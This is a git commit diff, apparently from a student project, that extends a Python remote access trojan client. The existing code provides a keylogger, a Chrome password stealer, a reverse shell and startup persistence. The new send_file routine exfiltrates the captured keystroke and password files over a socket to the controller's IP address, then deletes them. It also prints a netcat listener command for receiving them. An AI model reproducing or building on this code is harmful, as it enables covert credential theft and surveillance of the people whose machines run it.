e6bcc448d722f39ed765f559c9a87a25a4101b73
Rodrigo Martín Núñez <r.martin.nunez@student.tue.nl>
2022-06-16 15:20:09 +0200

    Added file transfer

--- src/client/client_main.py
+++ src/client/client_main.py
@@ -4,6 +4,8 @@ import socket
 from chrome_passwords import ChromePass
 from keylogger import KeyLogger
 from time import sleep
+import subprocess
+import os
 
 
 class Client:
@@ -15,7 +17,7 @@ class Client:
         - Gets a reverse shell back to the server
     """
 
-    def __init__(self, host: str, port: int, keylog_filename: str = ".activity.txt", chromepass_filename: str = ".chrome_log.txt") -> None:
+    def __init__(self, host: str, port: int = 9001, file_port: int = 9002, keylog_filename: str = ".activity.txt", chromepass_filename: str = ".chrome_log.txt") -> None:
         """
         Constructor
 
@@ -30,6 +32,7 @@ class Client:
 
         self.host = host
         self.port = port
+        self.file_port = file_port
         self.keylog_filename = keylog_filename
         self.chromepass_filename = chromepass_filename
 
@@ -63,15 +66,15 @@ class Client:
             
         elif choice == 2:
             self.keylogger.start_log()
-            self.send_data("\n\nKeylogging started to file '{}'...".format(self.keylog_filename))
+            self.send_data("\n\nKeylogging started to file '{}'...".format(self.keylog_filename), self.sock)
             
         elif choice == 3:
             self.keylogger.end_log()
-            self.send_data("\n\nKeylogging stopped...")
+            self.send_data("\n\nKeylogging stopped...", self.sock)
 
         elif choice == 4:
             self.chrome_pass.get_chrome_pass()
-            self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename))
+            self.send_data("\n\nChrome passwords saved to file '{}'...".format(self.chromepass_filename), self.sock)
         
         elif choice == 5:
             #ToDo
@@ -80,6 +83,15 @@ class Client:
         elif choice == 6:
             #ToDo
             pass
+        
+        elif choice == 7:
+            self.send_file(self.keylog_filename)
+            self.send_data("\n\n{} sent and deleted from client...".format(self.keylog_filename), self.sock)
+            
+        elif choice == 8:
+            self.send_file(self.chromepass_filename)
+            self.send_data("\n\n{} sent and deleted from client...".format(self.chromepass_filename), self.sock)
+
         
         self.run()
             
@@ -91,13 +103,7 @@ class Client:
 
         :param socket: Then socket to send the data through
         
-        :returns: The choice of the menu, options are...
-                    1: Rev shell
-                    2: Start keylogger
-                    3: Stop keylogger
-                    4: Get chrome passwords
-                    5: Add RAT to startup
-                    6: Remove RAT from startup
+        :returns: The choice of the menu
         """
         
         response = ""
@@ -109,14 +115,16 @@ class Client:
             3) Stop keylogger \n \
             4) Get chrome passwords \n \
             5) Add RAT to startup \n \
-            6) Remove RAT from startup \n\n \
+            6) Remove RAT from startup \n \
+            7) Receive keylogger file \n \
+            8) Receive chrome passwords file \n\n \
             \n Choice: "
         
-        self.send_data(menu_str)
+        self.send_data(menu_str, self.sock)
             
         
         # Receives messages from server
-        response = self.receive_data()
+        response = self.receive_data(self.sock)
         
         # Try to convert to int
         try:
@@ -125,38 +133,71 @@ class Client:
             pass
         
         # Check valid response
-        if not response in [1,2,3,4,5,6]:
-            self.send_data("\nNot a valid response!\n")
+        if not response in [1,2,3,4,5,6,7,8]:
+            self.send_data("\nNot a valid response!\n", self.sock)
             sleep(2)
             self.open_menu()
         
         return response
         
     
-    def send_data(self, data: str) -> None:
+    def send_data(self, data: str, sock: socket) -> None:
         """
         Sends data through socket
 
         :param data: The data to send
         """
-        self.sock.send(str.encode(data))
+        sock.send(str.encode(data))
 
 
-    def receive_data(self) -> str:
-            """
-            Receives data through socket
-            """
+    def receive_data(self, sock: socket) -> str:
+        """
+        Receives data through socket
+        """
+        
+        data = ""
+        # Wait until data is received
+        while data == "":
+            data = sock.recv(1024).decode("UTF-8")
+        
+        return data
+    
 
-            data = ""
+    def send_file(self, filename: str) -> None:
+        
+        response = ""
+        
+        # Instructions
+        self.send_data(f"\nTo receive file {filename}: \n \
+        run command in another terminal:\n\n \
+        nc -l -p {self.file_port} > {filename} \n", self.sock)
+        
+        # Wait for enter press
+        while not response == "\n":
+            self.send_data("Press enter to send file {}: ".format(filename), self.sock)
+            response = self.receive_data(self.sock)
+        
+        # Create file client instance
+        file_client = Connection(self.host, self.file_port)
+        
+        # Open socket connection for file transfer
+        file_sock = file_client.connect()
+        
+        # Open and read file
+        with open(filename, "r") as f:
+            file_content = f.read()
             
-            # Wait until data is received
-            while data == "":
-                data = self.sock.recv(1024).decode("UTF-8")
-            
-            return data
+        # Remove file
+        os.remove(filename)
+        
+        # Send the file data
+        self.send_data(file_content, file_sock)
+        
+        # Close connection when finished
+        file_sock.close()
 
 
 if __name__ == "__main__":
     # Run RAT with specified IP and port continiously
     while 1:
-        Client("192.168.178.92", 9001).run()
+        Client("192.168.178.92").run()
